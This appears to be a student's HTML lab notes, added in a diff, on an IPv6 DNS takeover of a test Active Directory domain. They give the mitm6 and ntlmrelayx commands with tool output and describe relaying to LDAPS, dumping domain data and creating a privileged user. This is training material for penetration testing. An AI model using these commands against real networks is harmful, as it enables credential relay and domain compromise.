@@ -1,0 +1,67 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>IPv6 DNS Takeover via mitm6</title>
+</head><body>We to set the domain using the mitm6 <br/>
+<b>Command : mitm6 -d marvel.local</b><br/>
+where d stands for domain <br/>
+<br/>
+<img height="144" src="ipv6.png" width="550"/><br/>
+<br/>
+Also have to setup a relay attack <br/>
+-6 stands for IVP6<br/>
+-t stands for target will point to our domain controller's ip address<br/>
+and we have configured the certificate so that we can use ldaps<br/>
+<br/>
+┌──(root㉿kali)-[/opt/mitm6]<br/>
+<b>└─# ntlmrelayx.py -6 -t ldaps://192.168.205.137 -wh fakewpad.marvel.local -l lootme </b><br/>
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation<br/>
+<br/>
+[*] Protocol Client SMTP loaded..<br/>
+[*] Protocol Client LDAP loaded..<br/>
+[*] Protocol Client LDAPS loaded..<br/>
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.<br/>
+[*] Protocol Client MSSQL loaded..<br/>
+[*] Protocol Client SMB loaded..<br/>
+[*] Protocol Client IMAPS loaded..<br/>
+[*] Protocol Client IMAP loaded..<br/>
+[*] Protocol Client HTTPS loaded..<br/>
+[*] Protocol Client HTTP loaded..<br/>
+[*] Running in relay mode to single host<br/>
+[*] Setting up SMB Server<br/>
+[*] Setting up HTTP Server<br/>
+<br/>
+<br/>
+<br/>
+<img src="ntlm1.png"/><br/>
+<br/>
+We have to reboot our windows 10 machine (i.e. the punisher in our case) to trigger the event and will wait for something before we login as ADMIN<br/>
+We can see it is trying to Enumerate user's privileges which we take a while and domain info is dumped into Lootdir <br/>
+<br/>
+<img height="258" src="ntlm4.png" width="550"/><br/>
+<br/>
+We succeded with an computer and the computer were able to accessing the domain controller via Ldaps logging into it and dumpping any useful information to us.<br/>
+Now we will login into a computer (i.e. an admin login to a computer) and was able to make user there.<br/>
+<br/>
+<img src="ntlm2.png"/><br/>
+<br/>
+<img src="ntlm3.png"/><br/>
+<br/>
+<img src="ntlm3 2.png"/><br/>
+<br/>
+We got a new user made for us and can see the user name and password above but they have set up the policy for us to have exclusive priveliges for the access control <br/>
+<br/>
+<img height="381" src="ntlm5.png" width="600"/><br/>
+<br/>
+It stores the aclpwn here so that we can restore the acl for what it was before <br/>
+<img src="image.png"/><br/>
+<br/>
+<br/>
+This is a fantastic attack and it's not the only thing it can do (i.e. we can ot only add a new user but can also add a new user)<br/>
+<br/>
+Resources for this video:<br/>
+mitm6: <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</a><br/>
+<br/>
+Combining NTLM Relays and Kerberos Delegation: <a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/</a><br/>
+<br/>
+</body></html>
